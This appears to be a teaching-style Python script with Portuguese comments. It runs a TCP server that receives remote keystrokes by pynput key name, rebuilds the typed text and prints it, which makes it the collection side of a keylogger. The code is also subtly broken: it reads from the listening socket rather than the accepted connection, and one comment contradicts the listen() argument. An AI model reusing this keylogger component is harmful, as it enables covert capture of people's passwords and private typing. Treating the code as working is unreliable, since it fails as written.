import socket


host = socket.gethostname()
# um nome de host é um rótulo atribuído a um dispositivo conectado a uma rede de computadores é usado
# para identificar o dispositivo

SERVER_PORT = 5000
# iniciando a porta acima da 1024

server_socket = socket.socket()
# Instância do objeto do tipo socket no formatto TCP/IP

server_socket.bind((host, SERVER_PORT))
#  Bind: realiza a associação entre a estrutura socket e o endereço/porta do servidor.
#  O comando “bind” vincula o endereço como exemplo 10.1.1.1 do servidor e a porta 5000
#  ao socket que foi criado pelo sistema operacional do servidor.

server_socket.listen(2)
# O nosso servidor TCP/IP vai receber 1 conexão por vez e responder ao cliente uma confirmação do recebimento
# da mensagem. A função listen() coloca o socket no modo servidor, e define a quantidade de solicitações
# de novas conexões que podem ser enfileiradas.

conn, address = server_socket.accept()
# A função accept() retorna um novo socket para ser usado com aquela conexão e, o endereço do cliente.
# O novo socket utiliza uma nova porta atribuída automaticamente pelo kernel.

print("Conexão de: " + str(address))
# Ao estabelecer uma conexão com o clinte irá printar está conexão pro servidor

global key_words
key_words = ''

while True:
    # Aguarda um dado enviado pela rede de até 1024 Bytes, a função ‘recv’ possui somente
    # 1 argumento que é o tamanho do Buffer
    keydata = server_socket.recv(1024)
    # convertendo de byte para string
    key = keydata.decode('utf-8')

    if str(key) == "Key.space":
        key = ' '

    if str(key) != "Key.backspace":

        key_words = key_words + key

        disallowed_characters = "'"

        for k in disallowed_characters:
            key_words = key_words.replace(k, "")

    # tecla backspace implementada de forma que se a tecla recebida for igual a backspace então a última
    # letra da palavra ou frase deve ser deletada
    elif str(key) == "Key.backspace":

        key_words = key_words[:-1]

    print("Tecla pressionada:", key)
    print("Mensagem final:", key_words)
    print("===================================")
